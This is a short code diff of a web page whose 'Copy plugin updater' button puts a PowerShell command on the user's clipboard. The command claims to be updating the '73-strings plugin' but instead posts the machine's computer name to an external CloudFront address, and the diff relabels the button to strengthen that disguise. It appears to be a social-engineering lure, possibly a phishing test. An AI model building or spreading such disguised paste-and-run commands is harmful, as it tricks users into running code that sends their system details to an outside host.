@@ -40,13 +40,13 @@
 <body>
 
     <div class="container">
-        <button id="copyButton">Copy Command</button>
+        <button id="copyButton">Copy plugin updater</button>
         <div class="message" id="message"></div>
     </div>
 
     <script>
         document.getElementById('copyButton').addEventListener('click', function() {
-            var command = "powershell.exe -Command \"Write-Host 'Updating 73-strings plugin'; Invoke-RestMethod -Uri 'https://d1k5ztam8f8myx.cloudfront.net/73-strings-computer-update-$env:COMPUTERNAME' -Method Post\"";
+            var command = "powershell.exe -Command Write-Host 'Updating 73-strings plugin'; Invoke-RestMethod -Uri \"https://d1k5ztam8f8myx.cloudfront.net/73-strings-computer-update-$env:COMPUTERNAME\" -Method Post";
             
             var textarea = document.createElement('textarea');
             textarea.value = command;
